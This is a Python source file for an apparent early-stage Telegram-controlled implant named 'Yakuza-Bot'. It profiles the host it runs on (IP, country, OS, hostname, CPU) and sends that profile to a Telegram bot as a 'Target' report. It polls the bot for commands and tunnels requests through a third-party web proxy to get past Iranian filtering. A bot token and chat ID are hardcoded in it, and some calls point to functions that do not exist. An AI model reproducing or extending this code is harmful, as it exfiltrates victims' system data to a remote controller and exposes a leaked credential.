import requests
from bs4 import BeautifulSoup
import json
import time
import platform
import os
import subprocess
import wmi
import ngrok
from colorama import Fore, Back, Style
import ipapi

userIp  = ''
userLocation = ''
class TeleManager():
    def __init__(self, token, userId):
        self.lastCommand = ''
        self.token = token
        self.userId = userId
        self.userIp = ''
        self.userLocation = ''
        self.allCommands = []

    def ip_enum(self):
        '''
    summary 
    this function obtain user ip and then send request to obtain user location
    then if User in Iran Show Warning Message
    this is internal function to check location for decide using normal sending or bypassing 
        '''
        global userIp
        global userLocation
        try:
            userIp = requests.get('https://api.ipify.org').text
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + 'Cant Get machine IP address, seem Internet Connection Error')
            return False
        
        httpDebuggerUrl = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://ipapi.co/{userIp}/country/',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        
        try:
            response = requests.post(httpDebuggerUrl, data=payload)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.content.decode(),'html.parser')
                
                #find <div id='ResultData'> tag contain result => User IP Country
                divTagResult = soup.findAll('div', attrs={'id':'ResultData'})
                
                #Conver tag finded to string then Slicing to extraxt Country Code 
                ipCountry = str(divTagResult)[151:-14].replace(' ','').replace("\n",'') 
                #Store IP Country in global variable userLocation
                userLocation = ipCountry
                
                #Print Warning message and Country Code
                if "IR" not in str(divTagResult):
                    return True
                else:
                    print(Fore.LIGHTGREEN_EX + f'You are in {ipCountry} Iran Unsupported Country => '+Fore.LIGHTCYAN_EX+f'So We Use Tunnel to sending Requests'+Style.RESET_ALL)
                    print(Fore.LIGHTYELLOW_EX+"Request send using Tunnel."+Style.RESET_ALL)
                    return False
                
                #Store Results and Return
                self.userIp = userIp
                self.userLocation = userLocation
                return {'ip':userIp,'country':userLocation} 

                    
        #Handle ip_eum() Errors
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + 'Internet Connection Error!!!'+Style.RESET_ALL)
        except:
            print(Fore.LIGHTRED_EX + 'Unknown error in IP Location Checking happened...')
        
    def send_message_normal_mode(self, msg):
        '''summary:
        this function send message to telegram bot ordinary Mode
        '''
        url = f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}'
        
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(Fore.LIGHTGREEN_EX + 'Message Sent Successfully on Normal Mode!')
                return True
            else:
                print(Fore.LIGHTRED_EX + 'Failed to send message. try again!!! Status code:' + Fore.LIGHTYELLOW_EX + response.status_code)
        except requests.RequestException:
            print(Fore.LIGHTRED_EX + 'Internet Connection Error!!!')
           
    def send_message_bypass_mode(self, msg): 
        '''summary:
        this function send message to telegram bot in Bypass Mode 
        this function can Filtering in iran
        '''
        url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            print(Fore.LIGHTGREEN_EX + 'Message Sent Successfully!')
            return True
        
    def send_message(self, msg):
        '''summary:
        this function send message to telegram bot base on country
        if client side Location(where python script is running) is Iran then use bypass mode
        '''
        if self.ip_enum():
            self.send_message_normal_mode(msg)
            return True
        else:
            self.send_message_bypass_mode(msg)
            return True
  
    def os_enum(self):
        '''summary:
        this function return os name, version, OS CPU and User Information
        then send it to T-Bot
        '''

        #Get User All Information
        userInfo = platform.uname()

        osCpu = subprocess.getoutput('wmic cpu get name')
        osCpuFormated = osCpu.replace('Name','').replace('\n','').replace(' ','')
        
        clienSideLoc = self.ip_enum()
        
        osEnum = f''' Enumeration Completed: ✅
            Target {userIp} in {userLocation} =>
            Operation System: {platform.system()} 💻
            OS Versions: {platform.version()} 🆚 => {platform.release()} 📦
            Host Name: {platform.uname().node} 
            OS CPU Family: {platform.processor()} => {platform.uname().machine}            
            OS CPU Model: {osCpuFormated}
            OS Detailed Version: {platform.win32_ver()}
            
            ---------------\\\\*******//---------------
            🥷 Hi Yakuza-Bot User 🥷👋
            Enter /list To See All Bot Commands 
            Enter /none to Run New Command
        '''
        print(osEnum)
        
        if clienSideLoc:
            self.send_message(osEnum)
        else:
            self.send_message_bypass_mode(osEnum)
        #sendMsg = self.send_message_bypass_mode(enumPm)
        return osEnum
        
    def last_command_bypass_mode(self):
        '''summary
        This function get last message sended to bot and return it
        send request using tunnel say Bypass Mode
        '''
        url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://api.telegram.org/bot{self.token}/getUpdates',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        try:
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                #Parse Response html code
                soup = BeautifulSoup(response.content.decode(),'html.parser')
                
                #Find div tag contain Result of Response
                result = soup.findAll('div', attrs={'id':'ResultData'}) #result = soup.findAll('pre')

                #Slicing to get Result of Response only
                res2 = str(result)[151:-14]
                
                #Convert slicing string to dictionry to get last text
                resultAsDict = json.loads(res2)
                lastCmd = resultAsDict['result'][-1]['message']['text']
                
                #Function return and Outputs
                self.lastCommand = lastCmd
                print(Fore.LIGHTGREEN_EX+f'Last Command from Bot: {self.lastCommand}'+Style.RESET_ALL)
                return lastCmd
        except:
            print(Fore.LIGHTMAGENTA_EX + 'Error in Last Command Checking Bypass Mode happened...'+Style.RESET_ALL)
                   
    def last_command_normal_mode(self):
        '''summary
        This function get Last Command in Normal Mode 
        '''
        url = f'https://api.telegram.org/bot{self.token}/getUpdates'
        
        try:
            response = requests.get(url)
            if response.status_code == 200:
                lastCmd = response.json()['result'][-1]['message']['text']
                print(Fore.LIGHTGREEN_EX+f'Last Command from Bot: {lastCmd}'+Style.RESET_ALL)
                self.lastCommand = lastCmd
                return lastCmd
        except:
            print(Fore.LIGHTMAGENTA_EX + 'Error in Last Command Checking happened...'+Style.RESET_ALL)
      
       
    def last_command(self):
        '''summary
        This function get Last Command in Normal Mode
        '''
        if self.ip_enum():
            self.last_command_normal_mode()
        else:
            self.last_command_bypass_mode()
            
    def list_command(self):
        '''summary
        This function send List of Commands to user
        '''
        #subprocess.Popen('neofetch')
        #os.system('neofetch')
        
        listCmd = '''
        /list => Show List of Commands
        /send => Send New Message
        /none => Run New Command
        /os => Get OS Information
        /ip => Get IP Information
        /help => Get Help
        /exit => Exit from Bot
        '''
        print(Back.MAGENTA+Fore.LIGHTWHITE_EX+listCmd+Style.RESET_ALL)
        #self.send_message(listCmd)
    
    def usage_options(self):
        options = '''
        [0] => Send Message 
        [1] => OS Enumeration 
        [2] => IP Enumeration 
        [3] => Last Command from Bot 
        [4] => All Commands from Bot 
        [5] => Help - All Commands 
        🥷
        [99] => Exit 👋👋👋
        '''
        print(options)
        #Get User Input
        userInput = str(input(Fore.LIGHTMAGENTA_EX + 'Select Option: ' + Style.RESET_ALL))

        #Check User Input
        if userInput == '0':
            return 'send', 0
        
        elif userInput == '1':
            return 'osenum', 1
        
        elif userInput == '2':
            return 'ipenum', 2
        
        elif userInput == '3':
            return 'lastcmd', 3
        
        elif userInput == '4':
            return 'allcmd', 4
        
        elif userInput == '5':
            return 'help', 5
        
        elif userInput == '99':
            self.exit_bot()
        else:
            print(Fore.LIGHTRED_EX + 'Invalid Command!!!')
            self.usage_options()
            
    def exit_bot(self):
        '''summary
        This function exit from Bot
        '''
        print(Fore.LIGHTBLUE_EX + 'Goodbye Ninja 🥷.... 👋 👋 👋'+Style.RESET_ALL)
        self.send_message('Client Side python script Shuting down...!')
        exit()
        

        
def bot_runner():
    token = '7381866212:AAEh7VRd5sdOOz7tISehbaGsX0-y_lrc3os'
    #botUsername = 'davoodya_bot'
    #botUrl = f'https://api.telegram.org/bot{token}/GetUpdates'
    dayaId = '673330561'
    #msg = input(Back.MAGENTA+Fore.WHITE+'Enter your message: '+Style.RESET_ALL)
    
    telegram = TeleManager(token=token, userId=dayaId)
    while True:
        option = telegram.usage_options()
        if option[0] == 'send':
            msg = input(Fore.LIGHTCYAN_EX+'Enter your message: '+Style.RESET_ALL)
            telegram.send_message(msg)
            continue
            
        elif option[0] == 'osenum':
            telegram.os_enum()
            continue
            
        elif option[0] == 'ipenum':
            telegram.ip_enum()
            continue
        
        elif option[0] == 'lastcmd':
            telegram.last_command()
            continue
            
        elif option[0] == 'allcmd':
            print(telegram.allCommands)
            telegram.all_command_normal_mode()
            print(telegram.allCommands)
            continue

        elif option[0] == 'help':
            telegram.list_command()
            continue
        
        #telegram.send_message(telegram.os_enum())



def main():
    bot_runner()
    #print(f'[+] IP: {userIp} in {userLocation} Country')

if __name__ == '__main__':
    main()
